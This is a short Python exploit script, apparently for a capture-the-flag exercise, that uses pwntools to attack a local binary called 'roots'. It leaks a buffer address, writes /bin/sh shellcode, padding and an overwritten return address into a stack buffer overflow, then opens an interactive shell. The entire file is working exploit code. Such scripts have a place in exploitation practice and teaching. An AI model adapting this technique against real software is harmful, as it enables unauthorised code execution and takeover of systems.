from pwn import *
context.binary = './roots'
elf = context.binary
context.log_level = 'debug'
shellcode = asm(shellcraft.sh())
buffer_size = 256
padding_size = 264

if len(shellcode) > buffer_size:
	log.warning(f"Shellcode length ({len(shellcode)}) exceeds buffer size ({buffer_size}). Exploit may fail.")
p = process(['./roots', 'A'])
leaked = p.recvline().strip()

try:
	buffer_addr = int(leaked, 16)
except Exception as e:
	log.error(f"Failed to parse leaked address: {leaked}")
	exit(1)

log.success(f'Leaked buffer address: {hex(buffer_addr)}')
p.close()
ret_addr = buffer_addr + 0x10
payload  = shellcode
payload += b'A' * (padding_size - len(shellcode))
payload += p64(ret_addr)
log.info(f"Payload length: {len(payload)} bytes")
log.info(f"Return address overwrite: {hex(ret_addr)}")
p = process('./roots')
p.sendline(payload)

try:
	p.interactive()
except EOFError:
	log.error("EOF reached - shell probably didn't spawn or process crashed")

p.close()
